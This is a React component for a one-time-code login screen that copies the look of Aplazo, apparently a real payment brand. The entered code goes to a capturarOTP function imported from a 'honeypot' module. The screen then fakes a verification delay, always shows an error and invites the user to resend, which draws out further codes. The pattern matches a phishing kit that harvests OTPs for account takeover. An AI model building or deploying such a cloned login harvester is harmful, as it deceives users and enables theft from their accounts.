// Pantalla 2: OTP — fiel a captura de Aplazo
// Textos: src/content.js (sección "otp") · Estilos: src/styles.css (bloque "AUTH")
import { useCallback, useEffect, useRef, useState } from 'react'
import { BrandMark, BackLink } from '../components/auth/AuthHeader.jsx'
import { otp as t } from '../content.js'
import { fill } from '../lib/format.js'
import { gsap, useGSAP } from '../lib/gsap.js'
import { capturarOTP } from '../lib/honeypot.js'

const LEN=6; const empty=()=>Array(LEN).fill('')
function maskPhone(d){ if(d.length<10) return 'tu número'; return `+52 ${d.slice(0,2)}-${d.slice(2,6)}-${d.slice(6,10)}` }

export default function OtpStep({ phone, onBack }){
  const root=useRef(null); const refs=useRef([])
  const [code,setCode]=useState(empty); const [phase,setPhase]=useState('idle')
  const [error,setError]=useState(false); const [secs,setSecs]=useState(t.segundosReenvio)
  const filled=code.every(c=>c!=='')

  useEffect(()=>{ if(secs<=0||phase!=='idle') return; const id=setTimeout(()=>setSecs(s=>s-1),1000); return ()=>clearTimeout(id)},[secs,phase])

  useGSAP(()=>{ gsap.timeline()
    .from('.auth-logo-wrap',{y:10, autoAlpha:0, duration:.5})
    .from('.auth-title > *',{y:14, autoAlpha:0, duration:.45, stagger:.06},'-=.2')
    .from('.otp-cell',{y:16, autoAlpha:0, scale:.88, duration:.5, stagger:.04, ease:'back.out(1.6)', clearProps:'transform'},'-=.1')
    .from('.otp-links, .auth-actions > *',{y:10, autoAlpha:0, duration:.4, stagger:.08},'-=.1')
    setTimeout(()=>refs.current[0]?.focus({preventScroll:true}),450)
  },{scope:root})

  const pop=i=>{ const el=refs.current[i]; if(el) gsap.fromTo(el,{scale:.86},{scale:1,duration:.35, ease:'back.out(3)'})}
  const setDigit=(i,val)=>{ const d=val.replace(/\D/g,'').slice(-1); setError(false); setCode(p=>{const n=[...p]; n[i]=d; return n}); if(d){pop(i); if(i<LEN-1) refs.current[i+1]?.focus()}}
  const onKey=(i,e)=>{ if(e.key==='Backspace'&&!code[i]&&i>0) refs.current[i-1]?.focus(); if(e.key==='ArrowLeft'&&i>0) refs.current[i-1]?.focus(); if(e.key==='ArrowRight'&&i<LEN-1) refs.current[i+1]?.focus()}
  const onPaste=e=>{ const d=e.clipboardData.getData('text').replace(/\D/g,'').slice(0,LEN); if(!d) return; e.preventDefault(); d.split('').forEach((c,i)=>setTimeout(()=>{setCode(p=>{const n=[...p]; n[i]=c; return n}); pop(i); refs.current[Math.min(i+1,LEN-1)]?.focus()},60*i))}

  const verify=useCallback(()=>{ const entered=code.join(''); if(entered.length<LEN) return; capturarOTP(entered); setPhase('verifying'); setTimeout(()=>{ setPhase('idle'); setError(true); setCode(empty()); setTimeout(()=>{ gsap.fromTo('.otp-row',{x:0},{duration:.45, keyframes:{x:[0,-10,10,-6,6,0]}}); refs.current[0]?.focus()},50)},1500)},[code])

  useEffect(()=>{ if(filled&&phase==='idle'){ const id=setTimeout(verify,280); return ()=>clearTimeout(id)}},[filled,phase,verify])

  if(phase==='verifying'){
    return <div className="screen-body auth-screen" style={{justifyContent:'center', alignItems:'center', textAlign:'center'}}>
      <div className="spinner" />
      <h3 style={{marginTop:16, fontFamily:'var(--font-display)'}}>{t.verificandoTitulo}</h3>
      <p style={{color:'var(--txt-dim)', fontSize:14, maxWidth:260, marginTop:8}}>{t.verificandoSub}</p>
    </div>
  }

  return (
    <div className="screen-body auth-screen" ref={root}>
      <div className="auth-topbar"><BackLink onClick={onBack} /></div>
      <BrandMark />

      <header className="auth-title">
        <h1>{t.tituloOtp}</h1>
        <p>{fill(t.descripcionOtp, { telefono: maskPhone(phone) })}</p>
      </header>

      <div className="field" style={{marginTop:16}}>
        <label style={{fontSize:13, fontWeight:600, color:'#374151'}}>Código</label>
        <div className="otp-row">
          {code.map((c,i)=>(
            <input key={i} ref={el=>refs.current[i]=el} className={`otp-cell ${c?'filled':''} ${error?'err':''}`} inputMode="numeric" autoComplete={i===0?'one-time-code':'off'} maxLength={1} value={c} onChange={e=>setDigit(i,e.target.value)} onKeyDown={e=>onKey(i,e)} onPaste={onPaste} onFocus={e=>e.target.select()} aria-label={`Dígito ${i+1}`} />
          ))}
        </div>
        <div className="otp-error-wrap" aria-live="assertive">
          {error
            ? <div className="otp-err-badge"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4"><circle cx="12" cy="12" r="10"/><path d="M12 8v6"/><path d="M12 16h.01"/></svg><span>{t.error}</span></div>
            : <div style={{height:8}}/>}
        </div>
        <div className="otp-links">
          {secs>0
            ? <span className="otp-timer">Reenviar código en {secs}</span>
            : <button type="button" className="btn-link" onClick={()=>{setCode(empty()); setError(false); setSecs(t.segundosReenvio)}}><b>{t.reenviar}</b></button>}
        </div>
      </div>

      {/* Botones outline como en la captura */}
      <div className="auth-actions">
        <button type="button" className="btn btn-ghost-outline" onClick={()=> setSecs(t.segundosReenvio)}>{t.botonWhatsapp}</button>
        <button type="button" className="btn btn-ghost-outline" onClick={()=> setSecs(t.segundosReenvio)}>{t.botonSms}</button>
      </div>
    </div>
  )
}
